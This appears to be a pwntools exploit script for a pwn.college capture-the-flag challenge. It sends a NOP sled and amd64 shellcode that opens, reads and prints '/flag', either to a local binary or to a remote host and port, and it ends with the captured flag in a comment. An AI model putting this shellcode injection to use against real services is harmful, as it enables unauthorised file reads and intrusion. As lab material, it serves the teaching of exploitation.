#!/usr/bin/env python3
from pwn import *

context.terminal = ['kitty', '-e']

exe = context.binary = ELF('./binary-exploitation-nopsled-shellcode', checksec=False)
libc = exe.libc

gdbscript = '''

'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            pause()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

p = start()

shellcode = asm('''
    xor rax, rax

    mov rax, 0x67616c662f
    push rax

    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x2
    syscall

    mov rdi, rax
    sub rsp, 0x100
    mov rsi, rsp
    mov rdx, 0x100
    xor rax, rax
    syscall

    mov rdi, 0x1
    mov rdx, rax
    mov rax, 0x1
    syscall

''', arch='amd64')

p.sendline(asm('nop') * 0x800 + shellcode)
p.interactive()
#pwn.college{ES8INxA-iipS0nZigNiIohN2lw-.dhTMywCMxADNwEzW}